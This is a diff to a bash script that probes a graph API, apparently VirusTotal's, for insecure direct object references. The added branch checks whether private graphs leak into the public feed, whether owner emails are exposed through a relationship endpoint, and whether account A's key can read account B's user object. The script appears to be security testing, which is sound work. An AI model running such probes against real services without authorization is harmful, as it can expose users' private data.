@@ -62,10 +62,9 @@ echo "═══ B: CREATE A PRIVATE GRAPH (account A) — try schema variants �
 GID=""; PRIV=""
 i=0
 for BODY in \
-  '{"data":{"type":"graph","attributes":{"private":true,"graph_data":{"version":"api-v1","data":{"nodes":[],"edges":[]}}}}}' \
-  '{"data":{"type":"graph","attributes":{"private":true,"graph_data":{"version":"5.0.0","data":{"nodes":[],"edges":[]}}}}}' \
-  '{"data":{"type":"graph","attributes":{"private":true,"graph_data":{"nodes":[],"edges":[]}}}}' \
-  '{"data":{"type":"graph","attributes":{"private":true}}}' ; do
+  '{"data":{"type":"graph","attributes":{"private":true,"graph_data":{"version":"5.0.0","description":"acl-test"}}}}' \
+  '{"data":{"type":"graph","attributes":{"private":true,"graph_data":{"version":"5.0.0"}}}}' \
+  '{"data":{"type":"graph","attributes":{"graph_data":{"version":"5.0.0"}}}}' ; do
   i=$((i+1)); printf '%s' "$BODY" > "$OUTDIR/newgraph$i.json"
   code=$(req POST "/graphs" A "$OUTDIR/newgraph$i.json"); sleep "$PACE"
   GID=$(python3 -c "import json;print(json.load(open('$OUTDIR/POST__graphs.json')).get('data',{}).get('id',''))" 2>/dev/null)
@@ -76,7 +75,33 @@ for BODY in \
     echo "  variant $i -> HTTP $code ; $(head -c 120 "$OUTDIR/POST__graphs.json" | tr -d '\n')"
   fi
 done
-if [ -z "$GID" ]; then echo "  !! all create variants failed — inspect $OUTDIR/POST__graphs.json"; exit 0; fi
+if [ -z "$GID" ]; then
+  echo "  !! create failed/forbidden. Pivoting to NO-CREATE checks on the public feed."
+  echo ""
+  echo "═══ B2: PUBLIC FEED / OWNER-PII checks (no creation needed) ═══"
+  # 1) does the public /graphs feed leak PRIVATE graphs?
+  code=$(req GET "/graphs?limit=40" A); sleep "$PACE"
+  npriv=$(grep -oE '"private": *true' "$OUTDIR/GET__graphs_limit_40.json" 2>/dev/null | wc -l)
+  ntot=$(grep -oE '"type": *"graph"' "$OUTDIR/GET__graphs_limit_40.json" 2>/dev/null | wc -l)
+  echo "  /graphs feed: $ntot graphs, $npriv marked private:true"
+  [ "${npriv:-0}" -gt 0 ] && { echo "  *** PRIVATE graphs appear in the PUBLIC feed => listing leak. Capture an id."; grep -oE '"id": "g[a-f0-9]+"' "$OUTDIR/GET__graphs_limit_40.json" | head -3 | sed 's/^/      /'; echo "feed-leak" >> "$OUTDIR/idor-hits.txt"; }
+  # 2) owner relationship on a public graph — does it leak email/PII?
+  if [ -n "$PUBID" ]; then
+    code=$(req GET "/graphs/$PUBID/relationships/owner?attributes=email,first_name,last_name" A); sleep "$PACE"
+    echo "  owner of public graph -> HTTP $code:"
+    head -c 220 "$OUTDIR/GET__graphs_${PUBID}_relationships_owner_attributes_email_first_name_last_name.json" 2>/dev/null | sed 's/^/      /'; echo
+    grep -qiE '"email"|@' "$OUTDIR/GET__graphs_${PUBID}_relationships_owner_attributes_email_first_name_last_name.json" 2>/dev/null && { echo "  *** owner email/PII exposed via relationship"; echo "owner-pii" >> "$OUTDIR/idor-hits.txt"; }
+  fi
+  # 3) can we read ANOTHER user's private objects by guessing the users endpoint?
+  code=$(req GET "/users/$VT_USER_B" A); sleep "$PACE"
+  echo "  cross-read account B's user object with A's key -> HTTP $code"
+  head -c 200 "$OUTDIR/GET__users_${VT_USER_B}.json" 2>/dev/null | sed 's/^/      /'; echo
+  echo ""
+  echo "  -> If feed-leak/owner-pii flagged above, confirm by hand. Else VT graph"
+  echo "     creation is premium-gated; pivot to comments/votes IDOR or another target."
+  echo ""
+  echo "Evidence: $OUTDIR"; exit 0
+fi
 code=$(req GET "/graphs/$GID" A); sleep "$PACE"
 echo "  owner GET /graphs/$GID -> HTTP $code (sanity: 200 for owner)"
 echo ""
